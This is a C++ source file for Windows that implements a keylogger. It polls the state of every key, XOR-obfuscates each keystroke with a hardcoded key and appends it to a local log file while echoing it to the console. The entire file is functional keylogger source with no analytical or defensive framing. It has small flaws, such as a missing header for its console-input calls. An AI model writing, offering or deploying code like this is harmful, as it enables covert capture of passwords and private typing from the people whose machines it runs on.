#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <thread>
#include <mutex>
#include <chrono>
#include <atomic> // For atomic flag

std::string encryptionKey = "mysecretkey"; // Moved to global scope

std::string encrypt(const std::string& plaintext, const std::string& encryptionKey) {
    std::string ciphertext = "";
    for (size_t i = 0; i < plaintext.length(); i++) {
        ciphertext += static_cast<char>(plaintext[i] ^ encryptionKey[i % encryptionKey.length()]);
    }
    return ciphertext;
}

void keyloggerFunction(std::ofstream& logFile, std::mutex& logFileMutex, const std::string& encryptionKey, std::atomic<bool>& exitFlag) {
    while (!exitFlag) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                std::string keystroke = "";
                if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) {
                    continue;
                }
                if (i == VK_SPACE) {
                    keystroke = " ";
                } else if (i == VK_RETURN) {
                    keystroke = "\n";
                } else if (i == VK_TAB) {
                    keystroke = "\t";
                } else {
                    keystroke = static_cast<char>(i);
                }
                std::string encryptedKeystroke = encrypt(keystroke, encryptionKey);
                {
                    std::lock_guard<std::mutex> lock(logFileMutex);
                    logFile << encryptedKeystroke;
                    std::cout << "[" << i << "] " << keystroke << " (" << encryptedKeystroke << ")" << std::endl;
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main() {
    bool enableKeylogger = true;
    std::ofstream logFile;
    std::mutex logFileMutex;
    std::atomic<bool> exitFlag(false);

    if (enableKeylogger) {
        logFile.open("keylogger.log", std::ios_base::app);
        if (!logFile) {
            std::cerr << "Error opening the log file." << std::endl;
            return 1;
        }

        std::thread keyloggerThread(keyloggerFunction, std::ref(logFile), std::ref(logFileMutex), encryptionKey, std::ref(exitFlag));
        keyloggerThread.detach();

        // Wait for termination signal (e.g., Ctrl+C)
        std::cout << "Press Ctrl+C to exit the program." << std::endl;
        while (true) {
            if (_kbhit()) {
                char userInput = _getch();
                if (userInput == 3) { // Ctrl+C pressed
                    exitFlag = true;
                    break;
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        logFile.close();
    }

    return 0;
}
